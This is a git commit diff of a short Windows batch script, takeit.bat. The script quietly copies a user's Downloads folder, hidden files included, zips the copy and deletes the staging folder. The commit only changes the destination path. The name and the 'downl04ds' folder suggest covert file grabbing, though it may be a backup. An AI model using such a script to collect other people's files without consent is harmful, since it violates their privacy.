203742b4bb7c56b87c67d535e692f60200e73408
dreadnought24-rgb <sofyanrezky097@gmail.com>
2026-09-11 09:32:04 +0700

    Update takeit.bat

--- mirror/takeit.bat
+++ mirror/takeit.bat
@@ -1,11 +1,11 @@
 @echo off
 set backupcmd=xcopy /s /c /d /e /h /i /r /y
-set dest=C:program\hasil
+set dest=C:wadah\hasil
 
 %backupcmd% "%USERPROFILE%\Downloads" "%dest%\downl04ds"
 
 :: buat zip
-powershell -command "Compress-Archive -Path '%dest%\*' -DestinationPath 'C:\program\hasil.zip' -Force"
+powershell -command "Compress-Archive -Path '%dest%\*' -DestinationPath 'C:\wadah\hasil.zip' -Force"
 
 :: hapus folder mentah setelah zip berhasil dibuat
 rmdir /s /q "%dest%"
